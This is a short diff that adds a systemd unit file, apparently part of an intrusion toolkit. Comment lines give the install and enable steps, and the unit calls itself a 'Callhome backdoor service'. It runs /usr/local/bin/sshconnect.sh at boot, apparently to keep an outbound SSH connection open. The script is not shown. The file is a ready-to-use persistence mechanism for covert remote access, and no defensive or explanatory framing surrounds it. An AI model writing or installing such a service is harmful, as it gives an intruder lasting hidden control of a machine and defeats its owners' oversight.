@@ -1,0 +1,14 @@
+# Place in /etc/systemd/system/callhome.service
+# systemctl daemon-reload
+# systemctl enable callhome
+# systemctl start callhome
+
+[Unit]
+Description=Callhome backdoor service
+Requires=networking.service
+After=networking.service
+[Service]
+ExecStart=/usr/local/bin/sshconnect.sh
+Type=idle
+[Install]
+WantedBy=multi-user.target
